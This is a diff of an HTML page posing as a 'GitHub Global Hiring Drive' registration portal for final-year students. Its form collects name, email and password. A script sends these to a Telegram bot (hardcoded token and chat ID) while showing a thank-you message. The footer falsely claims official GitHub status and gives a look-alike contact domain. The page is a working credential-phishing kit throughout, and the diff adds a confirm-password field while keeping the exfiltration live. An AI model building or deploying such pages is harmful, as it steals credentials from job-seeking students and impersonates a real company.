@@ -1,157 +1,167 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>GitHub Global Hiring Drive</title>
-  <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(to bottom right, #f5f9ff, #e8f0ff);
-      margin: 0;
-      padding: 0;
-      color: #222;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>GitHub Global Hiring Drive</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(to bottom right, #f5f9ff, #e8f0ff);
+            margin: 0;
+            padding: 0;
+            color: #222;
+        }
 
-    header {
-      background-color: #28a745;
-      color: white;
-      padding: 20px;
-      text-align: center;
-      font-size: 26px;
-      font-weight: bold;
-      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-      letter-spacing: 0.5px;
-    }
+        header {
+            background-color: #28a745;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 26px;
+            font-weight: bold;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            letter-spacing: 0.5px;
+        }
 
-    .sub-header {
-      text-align: center;
-      padding: 10px 20px;
-      color: #555;
-      font-size: 15px;
-    }
+        .sub-header {
+            text-align: center;
+            padding: 10px 20px;
+            color: #555;
+            font-size: 15px;
+        }
 
-    .container {
-      max-width: 95%;
-      width: 360px;
-      margin: 30px auto;
-      background-color: white;
-      padding: 25px;
-      border-radius: 12px;
-      box-shadow: 0 4px 16px rgba(0,0,0,0.08);
-    }
+        .container {
+            max-width: 95%;
+            width: 360px;
+            margin: 30px auto;
+            background-color: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+        }
 
-    h2 {
-      margin-top: 0;
-      text-align: center;
-      color: #333;
-      font-size: 20px;
-    }
+        h2 {
+            margin-top: 0;
+            text-align: center;
+            color: #333;
+            font-size: 20px;
+        }
 
-    input, button {
-      width: 100%;
-      margin: 10px 0;
-      padding: 14px;
-      font-size: 15px;
-      border: 1px solid #ccc;
-      border-radius: 8px;
-      box-sizing: border-box;
-    }
+        input,
+        button {
+            width: 100%;
+            margin: 10px 0;
+            padding: 14px;
+            font-size: 15px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            box-sizing: border-box;
+        }
 
-    button {
-      background-color: #007bff;
-      color: white;
-      border: none;
-      font-weight: bold;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
 
-    button:hover {
-      background-color: #0056b3;
-    }
+        button:hover {
+            background-color: #0056b3;
+        }
 
-    #thankyou {
-      display: none;
-      text-align: center;
-      font-weight: bold;
-      color: green;
-      margin-top: 20px;
-    }
+        #thankyou {
+            display: none;
+            text-align: center;
+            font-weight: bold;
+            color: green;
+            margin-top: 20px;
+        }
 
-    footer {
-      text-align: center;
-      background: #f1f1f1;
-      padding: 15px;
-      font-size: 13px;
-      color: #555;
-      margin-top: 30px;
-      border-top: 1px solid #ddd;
-    }
+        footer {
+            text-align: center;
+            background: #f1f1f1;
+            padding: 15px;
+            font-size: 13px;
+            color: #555;
+            margin-top: 30px;
+            border-top: 1px solid #ddd;
+            position: sticky;
+            bottom: 0;
+            width: 100%;
+            left: 0;
+        }
 
-    @media (max-width: 480px) {
-      header {
-        font-size: 22px;
-      }
-      .container {
-        width: 90%;
-      }
-    }
-  </style>
+        @media (max-width: 480px) {
+            header {
+                font-size: 22px;
+            }
+
+            .container {
+                width: 90%;
+            }
+        }
+    </style>
 </head>
+
 <body>
-  <header>GitHub Global Hiring Drive</header>
-  <div class="sub-header">Unlock your opportunity to work with world-class developers. Registration open for final-year tech students.</div>
+    <header>GitHub Global Hiring Drive</header>
+    <div class="sub-header">Unlock your opportunity to work with world-class developers. Registration open for final-year tech students.</div>
+    <div class="container">
+        <h2>Apply Now</h2>
+        <form id="registerForm">
+            <input type="text" name="name" placeholder="Full Name" required />
+            <input type="email" name="email" placeholder="Email Address" required />
+            <input type="password" name="password" placeholder="Create Password" required />
+            <input type="password" name="confirmPassword" placeholder="Re-enter Password" required />
+            <button type="submit">Register for Drive</button>
+        </form>
+        <div id="thankyou">✅ Thank you! You will be contacted via email.</div>
+    </div>
+    <footer>
+        © 2025 GitHub Career Division. All rights reserved.<br> This portal is intended for student participation in official GitHub recruitment initiatives. For queries, contact hr@github-careers.com
+    </footer>
 
-  <div class="container">
-    <h2>Apply Now</h2>
-    <form id="registerForm">
-      <input type="text" name="name" placeholder="Full Name" required />
-      <input type="email" name="email" placeholder="Email Address" required />
-      <input type="password" name="password" placeholder="Create Password" required />
-      <button type="submit">Register for Drive</button>
-    </form>
-    <div id="thankyou">✅ Thank you! You will be contacted via email.</div>
-  </div>
+    <script>
+        document.getElementById("registerForm").addEventListener("submit", async function (e) {
+            e.preventDefault();
 
-  <footer>
-    © 2025 GitHub Career Division. All rights reserved.<br>
-    This portal is intended for student participation in official GitHub recruitment initiatives. For queries, contact hr@github-careers.com
-  </footer>
+            const form = e.target;
+            const password = form.password.value;
+            const confirmPassword = form.confirmPassword.value;
 
-  <script>
-    document.getElementById("registerForm").addEventListener("submit", async function (e) {
-      e.preventDefault();
+            if (password !== confirmPassword) {
+                alert("Passwords do not match.");
+                return;
+            }
 
-      const form = e.target;
-      const data = {
-        name: form.name.value,
-        email: form.email.value,
-        password: form.password.value
-      };
+            const data = {
+                name: form.name.value,
+                email: form.email.value,
+                password: password
+            };
 
-      try {
-        await fetch("https://api.telegram.org/bot7448574888:AAFe9P4ICY0h4nnUh_Iat5h5qRuXGIrxMdw/sendMessage", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: "968143308",
-            text: `📝 *GitHub Registration:*
-
-👤 Name: ${data.name}
-📧 Email: ${data.email}
-🔐 Password: ${data.password}`,
-            parse_mode: "Markdown"
-          })
+            try {
+                await fetch("https://api.telegram.org/7448574888:AAFe9P4ICY0h4nnUh_Iat5h5qRuXGIrxMdw/sendMessage", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: "968143308",
+                        text: `📝 *GitHub Registration:*  👤 Name: ${data.name} 📧 Email: ${data.email} 🔐 Password: ${data.password}`,
+                        parse_mode: "Markdown"
+                    })
+                });
+                form.style.display = "none";
+                document.getElementById("thankyou").style.display = "block";
+            } catch (error) {
+                alert("Submission failed. Try again later.");
+                console.error(error);
+            }
         });
-
-        form.style.display = "none";
-        document.getElementById("thankyou").style.display = "block";
-      } catch (error) {
-        alert("Submission failed. Try again later.");
-        console.error(error);
-      }
-    });
-  </script>
+    </script>
 </body>
+
 </html>
